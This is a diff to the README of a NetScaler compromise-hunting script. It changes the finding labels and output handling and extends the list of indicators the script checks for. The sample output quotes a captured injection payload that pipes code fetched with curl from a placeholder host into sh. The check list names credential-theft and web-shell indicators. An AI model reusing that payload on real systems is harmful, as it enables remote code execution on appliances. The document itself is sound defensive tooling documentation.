@@ -15,21 +15,27 @@ so a clean appliance produces a three-line result.
 Copy the script to the appliance and run it as `root` from the shell:
 
 ```sh
-scp nshunt.sh nsroot@<netscaler-ip>:/tmp/
+scp nshunt.sh nsroot@<netscaler-ip>:/var/tmp/
 ssh nsroot@<netscaler-ip>
 shell
-sh /tmp/nshunt.sh
+cd /var/tmp
+sh nshunt.sh
 ```
 
 Or download it directly on an appliance with internet access:
 
 ```sh
+cd /var/tmp
 curl -O https://raw.githubusercontent.com/kolbicz/nshunt/main/nshunt.sh
 sh nshunt.sh
 ```
 
-The script changes nothing on the appliance. It only creates a temporary
-directory in `/tmp`, which it removes when it finishes. It needs nothing beyond
+The output is shown on screen and saved to `results-nshunt.txt` in the current
+directory (`/var/tmp` survives a reboot, `/tmp` does not). Set
+`NSHUNT_OUT=/path/file` to save it elsewhere.
+
+The script changes nothing on the appliance. Apart from the results file it only
+creates a temporary directory in `/tmp`, which it removes when it finishes. It needs nothing beyond
 the tools every NetScaler ships with (`sh`, `find`, `grep`, `awk`, `gzip`, `ls`).
 
 Copy it in **binary mode** (`scp`, or binary mode in WinSCP/FileZilla). If the
@@ -40,21 +46,25 @@ prints the command to fix it.
 
 Each finding is labelled:
 
-| Label    | Meaning |
-|----------|---------|
-| `HIGH`   | Evidence that the appliance was, or may have been, compromised |
-| `ATTACK` | Exploitation attempts found in the logs still on the appliance |
-| `CHECK`  | Unusual, needs a human look - may well be legitimate |
+| Label        | Meaning |
+|--------------|---------|
+| `COMPROMISE` | Signs that the appliance was, or may have been, compromised |
+| `ATTEMPT`    | Attack **attempts** found in the logs still on the appliance. An attempt is not a success - only `COMPROMISE` findings are signs that an attack worked |
+| `REVIEW`     | Unusual, needs a human look - often legitimate |
+
+The numbers in the `RESULT` line count finding blocks, i.e. kinds of evidence,
+not IP addresses or attempts. The output ends with a short "What this means"
+section that explains the result in plain words.
 
 Example:
 
 ```
-NetScaler quick hunt 1.3 - ns01 - 2026-09-30 14:43
+NetScaler quick hunt 1.4 - ns01 - 2026-09-30 14:43
 
-[HIGH] CVE-2019-19781 exploit files: this box was exploited (Jan 2020 wave)
+[COMPROMISE] CVE-2019-19781 exploit files: this box was exploited (Jan 2020 wave)
        Jan 11 2020 16:04  /var/vpn/bookmark/pwnpzi1337.xml  (exploit file name)
 
-[ATTACK] Shell commands sent in the VPN login name (command injection)
+[ATTEMPT] Shell commands sent in the VPN login name (command injection)
        203.0.113.10     3 attempt(s)  2026-09-29 07:28 .. 2026-09-29 13:31 UTC
          tried: pitboss PPE unexpectedly died NSPPE;U=http://203.0.113.10:8899/s;curl${IFS}$U|sh;# X
        Files the attacks tried to create:
@@ -63,9 +73,22 @@ NetScaler quick hunt 1.3 - ns01 - 2026-09-30 14:43
        Check firewall logs for connections from the NetScaler to:
          http://203.0.113.10:8899/s
 
-RESULT: 1 HIGH, 1 ATTACK, 0 CHECK.
+RESULT: 1 COMPROMISE, 1 ATTEMPT, 0 REVIEW.
+        (number of [COMPROMISE] / [ATTEMPT] / [REVIEW] blocks above - each block is one
+        kind of evidence, not an IP address or an attempt; see the lines in each block)
 Scanned: 24 bookmark files in /var/vpn/bookmark, 26 ns.log files, 5 web access log files (0 unreadable).
 Log checks only see logs still on the box (back to Sep 29); older attacks need your syslog server.
+
+What this means:
+  COMPROMISE - signs that the box WAS compromised. Treat it as compromised:
+               do not reboot or upgrade yet, copy /var/log and the listed
+               files off the box, check the HA peer, then rebuild it and
+               change nsroot, LDAP/RADIUS bind passwords and certificate
+               keys (Citrix CTX694799).
+  ATTEMPT    - attack attempts in the logs (on their own not proof of success);
+               together with the COMPROMISE findings they show when and
+               how the box was compromised.
+Saved to: /var/tmp/results-nshunt.txt
 ```
 
 ### Exit codes
@@ -81,10 +104,10 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
 ## What it checks
 
 1. **CVE-2019-19781 ("Shitrix") artifacts** - bookmark files in `/var/vpn/bookmark`
-   with the public exploit's file name (`pwnpzi*`) or template code are `HIGH`.
+   with the public exploit's file name (`pwnpzi*`) or template code are `COMPROMISE`.
    Bookmarks last modified during the January 2020 mass-exploitation wave are
-   `CHECK`, labelled as empty stub or real bookmarks, because the date alone is
-   not proof. Files owned by `nobody` in `/netscaler/portal/templates` are `HIGH`.
+   `REVIEW`, labelled as empty stub or real bookmarks, because the date alone is
+   not proof. Files owned by `nobody` in `/netscaler/portal/templates` are `COMPROMISE`.
 2. **Command injection through the VPN login** - failed logins and
    authentication requests in `ns.log*` whose user name contains shell syntax
    (`` ` ``, `${IFS}` also URL-encoded, `$(`, `| sh`) or a fake packet-engine
@@ -92,9 +115,9 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
    Summarised per attacker IP with the number of attempts, time range and
    payload, plus everything those IPs requested from the web server (status
    codes and successful URLs). For files the payload tried to create in a web
-   folder it reports whether they exist now (`HIGH` if so) and how the web
+   folder it reports whether they exist now (`COMPROMISE` if so) and how the web
    server answered requests for them. A successful (`2xx`) download after the
-   first attempt is `HIGH` - for example an attack that packs `/flash/nsconfig`
+   first attempt is `COMPROMISE` - for example an attack that packs `/flash/nsconfig`
    into a file in the login page and then downloads it. Successes before the
    attempt are only counted, not reported as an attack. It also lists download URLs to look for in your
    firewall logs. The same payload text copied into `/var/log/messages` is
@@ -108,7 +131,7 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
 5. **Files written by the web server** - files owned by `nobody` in
    `/var/netscaler/logon`, `/var/netscaler/gui` and `/netscaler/ns_gui`.
 6. **Hidden files** in web folders. The published web shell name
-   `.ctxs.receiver` is `HIGH`.
+   `.ctxs.receiver` is `COMPROMISE`.
 7. **Credential stealers in the login page** - JavaScript that contains an
    external URL next to code that captures or sends data (`password`, `fetch(`,
    `XMLHttpRequest`, `sendBeacon`, `atob`, `new Image`, ...), anywhere in the
@@ -119,12 +142,13 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
 9. **Crontabs** - user crontabs in `/var/cron/tabs`, and `/etc/crontab` lines
    that download from anywhere but the appliance itself.
 10. **Unknown programs in temp folders** (`/tmp`, `/var/tmp`, `/var/nstmp`),
-    excluding the NIC firmware tools and caches that NetScaler upgrades leave there.
+    excluding the NIC firmware tools and caches that NetScaler upgrades leave there
+    and the NetScaler Console Security Advisory scan scripts.
 11. **Web server config** (`/etc/httpd.conf`, `/flash/nsconfig/httpd.conf`) -
     PHP handlers for non-PHP files such as `.deb` or `.sig`, and aliases that map
     an image or CSS URL (e.g. `/vpn/media/<hex>.ico`, `receiver.min.css`) onto a
-    hidden, `.sig` or `.deb` file are `HIGH` (WHIPSHOT persistence).
-    `php_flag engine on` and commented-out protection lines are `CHECK`.
+    hidden, `.sig` or `.deb` file are `COMPROMISE` (WHIPSHOT persistence).
+    `php_flag engine on` and commented-out protection lines are `REVIEW`.
 12. **Startup scripts** (`rc.netscaler`, `nsbefore.sh`, `nsafter.sh`) that run
     Python, base64 loaders, downloads or `chmod +s` at boot, and decoders,
     Python one-liners or reversed path strings in `ns.conf` and `/etc/rc`.
@@ -157,8 +181,10 @@ If a check crashes, it is reported as `[SKIPPED]` and the remaining checks still
     and scanner strings (`ns-88771-poc`, `PoCbit`, `NX-CVE-OK`, `httpworkbench`),
     requests for the `.ctxs.receiver` web shell, 1-byte `nsepa.deb` probes,
     `vp_probe_nonexist`, `scanner-probe` logins, and errors for package or icon
-    files in Gateway folders, each with its source IPs. HeadlessChrome requests
-    are `CHECK`.
+    files in Gateway folders, each with its status codes and source IPs. The
+    exploit canary `nx_verify.html` served with a `2xx` status is `COMPROMISE`:
+    it only exists if an injected command ran. HeadlessChrome requests are
+    `REVIEW`.
 21. **Shell history** (`sh.log*`, `bash.log*`) - commands that read LDAP
     credentials or keys (`ldapsearch`, `openssl s_client`, `F1.key` / `F2.key`,
     `/flash/nsconfig/keys`). Searches run with `grep` and friends, by you or by
